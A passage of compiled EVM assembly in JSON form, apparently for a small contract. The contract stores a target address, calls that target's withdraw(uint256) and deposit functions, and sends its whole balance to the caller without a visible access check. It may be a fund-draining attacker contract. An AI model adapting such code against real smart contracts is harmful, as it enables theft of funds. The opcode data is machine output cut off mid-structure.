									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 8010,
									"end": 8021,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8007,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 7991,
									"end": 8007,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 7991,
									"end": 8021,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220b35da691a1c2d37c667fcd099efdb3e5f550fb23ab55e8c96d5ca43c2fb5f65264736f6c63430006040033",
									".code": [
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "24D8E86B"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "64DD891A"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH",
											"source": 0,
											"value": "D0E30DB0"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 7813,
											"end": 8844,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "8"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "8"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "11"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "11"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8759,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8768,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8749,
											"end": 8768,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 8769,
											"end": 8790,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 8749,
											"end": 8791,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8699,
											"end": 8799,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8516,
											"end": 8528,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8532,
											"end": 8548,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8553,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8532,
											"end": 8553,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8599,
											"end": 8607,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "PUSH",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "PUSH",
											"source": 0,
											"value": "2E1A7D4D00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 38,
											"end": 42,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 29,
											"end": 36,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 67,
											"end": 77,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 96,
											"end": 154,
											"name": "PUSH",
											"source": -1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 199,
											"end": 207,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 192,
											"end": 196,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 186,
											"end": 190,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 167,
											"end": 177,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8554,
											"end": 8608,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "23"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
